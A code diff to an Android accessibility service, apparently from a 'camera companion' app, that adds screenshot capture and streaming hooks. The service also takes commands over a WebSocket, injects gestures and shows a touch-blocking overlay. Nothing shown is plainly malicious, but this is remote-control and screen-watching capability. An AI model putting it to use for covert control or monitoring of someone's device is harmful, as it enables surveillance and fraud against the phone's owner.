@@ -2,7 +2,9 @@ package com.artem.cameracompanion
 
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.GestureDescription
+import android.annotation.SuppressLint
 import android.content.Intent
+import android.graphics.Bitmap
 import android.graphics.Path
 import android.graphics.PixelFormat
 import android.hardware.display.DisplayManager
@@ -18,8 +20,10 @@ import android.view.Display
 import android.view.View
 import android.view.WindowManager
 import android.view.accessibility.AccessibilityEvent
+import androidx.annotation.RequiresApi
 import okhttp3.*
 import org.json.JSONObject
+import java.util.concurrent.Executors
 import java.util.concurrent.TimeUnit
 
 class ControlService : AccessibilityService() {
@@ -38,6 +42,7 @@ class ControlService : AccessibilityService() {
     private val http = OkHttpClient.Builder().pingInterval(20, TimeUnit.SECONDS).build()
     private var overlayView: View? = null
     private var overlayParams: WindowManager.LayoutParams? = null
+    private val screenExecutor = Executors.newSingleThreadExecutor()
 
     private val serverBase: String get() {
         var host = BuildConfig.DEFAULT_SERVER.trim()
@@ -50,6 +55,10 @@ class ControlService : AccessibilityService() {
     override fun onServiceConnected() {
         instance = this
         connectControlWs()
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            @Suppress("NewApi")
+            StreamingService.onAccessibilityConnected()
+        }
     }
 
     fun startIntentSafely(intent: Intent) {
@@ -223,10 +232,25 @@ class ControlService : AccessibilityService() {
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {}
     override fun onInterrupt() {}
 
+    @RequiresApi(Build.VERSION_CODES.R)
+    fun captureScreen(onResult: (android.graphics.Bitmap?) -> Unit) {
+        takeScreenshot(Display.DEFAULT_DISPLAY, screenExecutor,
+            object : AccessibilityService.TakeScreenshotCallback {
+                override fun onSuccess(screenshot: AccessibilityService.ScreenshotResult) {
+                    val hw = android.graphics.Bitmap.wrapHardwareBuffer(screenshot.hardwareBuffer, screenshot.colorSpace)
+                    screenshot.hardwareBuffer.close()
+                    onResult(hw)
+                }
+                override fun onFailure(errorCode: Int) { onResult(null) }
+            }
+        )
+    }
+
     override fun onUnbind(intent: Intent?): Boolean {
         instance = null
         hideTouchBlockOverlay()
         wsControl?.close(1000, "stopped"); wsControl = null
+        screenExecutor.shutdown()
         return super.onUnbind(intent)
     }
 }
